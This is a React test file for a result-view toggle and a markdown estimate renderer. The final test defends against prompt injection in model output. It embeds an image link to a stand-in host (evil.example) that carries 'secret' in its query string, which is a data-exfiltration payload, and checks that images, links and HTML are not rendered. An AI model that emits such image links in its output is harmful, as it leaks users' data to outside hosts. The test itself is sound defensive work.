import { render, screen, within } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { describe, expect, it, vi } from "vitest";
import { EstimateDocument, ResultViewToggle } from "./result-view-toggle";

describe("ResultViewToggle", () => {
  it("offers Structured and Document as one choice that always has a value", async () => {
    const onChange = vi.fn();
    const user = userEvent.setup();
    render(<ResultViewToggle value="structured" onChange={onChange} />);
    const group = screen.getByRole("radiogroup", { name: "Result view" });
    expect(within(group).getAllByRole("radio").map((radio) => radio.textContent)).toEqual(["Structured", "Document"]);
    await user.click(screen.getByRole("radio", { name: "Structured" }));
    expect(onChange).not.toHaveBeenCalled();
    await user.click(screen.getByRole("radio", { name: "Document" }));
    expect(onChange).toHaveBeenCalledWith("document");
  });
});

describe("EstimateDocument", () => {
  it("renders the server's markdown with tables in a keyboard-scrollable region", () => {
    render(<EstimateDocument markdown={"## Estimation: Portal\n\n| ID | Task | Expected |\n|---|---|---:|\n| T1 | API | 12.0 |\n"} />);
    expect(screen.getByRole("heading", { level: 2, name: "Estimation: Portal" })).toBeInTheDocument();
    const region = screen.getByRole("region", { name: "Table" });
    expect(region).toHaveAttribute("tabindex", "0");
    expect(within(region).getByRole("cell", { name: "12.0" })).toHaveStyle({ textAlign: "right" });
  });

  // The markdown carries model output, which a transcript can steer: an image would load a URL the moment it renders.
  it("never loads images or follows links from the model's text, and shows raw HTML as text", () => {
    const { container } = render(
      <EstimateDocument markdown={"Summary ![x](https://evil.example/p.png?d=secret) see [docs](https://evil.example) <b>bold</b>"} />,
    );
    expect(container.querySelector("img, a, link, b")).toBeNull();
    expect(container).toHaveTextContent("Summary see docs <b>bold</b>");
  });
});
